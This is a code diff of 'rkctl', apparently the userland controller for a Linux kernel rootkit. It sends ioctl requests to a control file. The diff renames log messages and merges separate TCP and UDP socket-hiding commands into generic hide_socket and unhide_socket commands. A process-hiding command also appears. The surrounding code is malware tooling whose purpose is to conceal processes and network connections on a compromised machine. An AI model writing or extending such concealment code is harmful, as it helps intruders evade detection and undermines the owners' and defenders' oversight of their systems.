@@ -11,21 +11,21 @@
 int do_ioctl_request(const char *desc, unsigned int request, void *data) {
 
     int fd;
-    printf("[ ] rkctl do_ioctl_request: %s\n", desc);
+    printf("[ ] rkctl-do_ioctl_request: %s\n", desc);
 
     if (0 > (fd = open(IOCTL_FILE_PATH, O_RDWR))) {
-        printf("[-] rkctl do_ioctl_request: Cannot open control file for ioctl\n");
+        printf("[-] rkctl-do_ioctl_request: Cannot open control file for ioctl\n");
         return -1;
     }
 
     if (0 > ioctl(fd, request, data)) {
-        perror("[-] rkctl do_ioctl_request: ioctl() failed");
+        perror("[-] rkctl-do_ioctl_request: ioctl() failed");
         return -1;
     }
 
     close(fd);
 
-    printf("[+] rkctl do_ioctl_request: Done.\n");
+    printf("[+] rkctl-do_ioctl_request: Done.\n");
     return 0;
 }
 
@@ -256,21 +256,13 @@ int main(int argc, const char *argv[]) {
 
         return do_process_hiding(RKCTL_HIDE_PID_RM, argc, argv);
 
-    } else if (!strcmp(cmd, "hide_socket_tcp")) {
+    } else if (!strcmp(cmd, "hide_socket")) {
 
-        return do_socket_hiding(RKCTL_TCP_HIDE, argc, argv);
+        return do_socket_hiding(RKCTL_HIDE_SOCKET, argc, argv);
 
-    } else if (!strcmp(cmd, "unhide_socket_tcp")) {
+    } else if (!strcmp(cmd, "unhide_socket")) {
 
-        return do_socket_hiding(RKCTL_TCP_UNHIDE, argc, argv);
-
-    } else if (!strcmp(cmd, "hide_socket_udp")) {
-
-        return do_socket_hiding(RKCTL_UDP_HIDE, argc, argv);
-
-    } else if (!strcmp(cmd, "unhide_socket_udp")) {
-
-        return do_socket_hiding(RKCTL_UDP_UNHIDE, argc, argv);
+        return do_socket_hiding(RKCTL_UNHIDE_SOCKET, argc, argv);
 
     } else {
         printf("[-] rkctl: command not supported\n");
